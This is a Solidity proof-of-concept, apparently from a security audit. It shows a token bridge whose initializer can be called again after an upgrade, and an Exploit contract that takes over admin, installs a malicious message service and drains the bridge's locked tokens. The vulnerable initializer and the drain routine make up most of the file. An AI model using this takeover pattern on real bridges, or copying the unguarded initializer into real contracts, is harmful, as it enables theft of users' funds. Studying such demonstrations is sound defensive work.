// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;
contract Token { mapping(address=>uint256) public balanceOf; function mint(address a,uint v) external {balanceOf[a]+=v;} function transfer(address a,uint v) external {balanceOf[msg.sender]-=v; balanceOf[a]+=v;} }
contract TokenBridge {
    bool public initialized; address public admin; address public messageService;
    // After the unsafe upgrade this now reads a new empty initialization slot.
    function initialize(address _admin) external {
        require(!initialized, "initialized");
        initialized = true; // @> VULN: the changed inheritance layout makes this live bridge appear uninitialized after upgrade.
        admin = _admin;
    }
    function setMessageService(address service) external { require(msg.sender==admin); messageService=service; }
    function completeBridging(address token,uint amount,address recipient,uint256,bytes calldata) external { require(msg.sender==messageService); Token(token).transfer(recipient,amount); }
}
contract MaliciousMessageService { address public immutable attacker; constructor(address a){attacker=a;} function drain(TokenBridge b,address t,uint a) external { b.completeBridging(t,a,attacker,1,""); } }
contract Exploit {
 Token public token; TokenBridge public bridge; uint public constant LOCKED=1000;
 constructor(){token=new Token(); bridge=new TokenBridge();}
 function run() external { token.mint(address(bridge),LOCKED); bridge.initialize(address(this)); MaliciousMessageService service=new MaliciousMessageService(address(this)); bridge.setMessageService(address(service)); service.drain(bridge,address(token),LOCKED); require(token.balanceOf(address(this))==LOCKED,"drain failed"); require(token.balanceOf(address(bridge))==0,"bridge retains tokens"); }
}
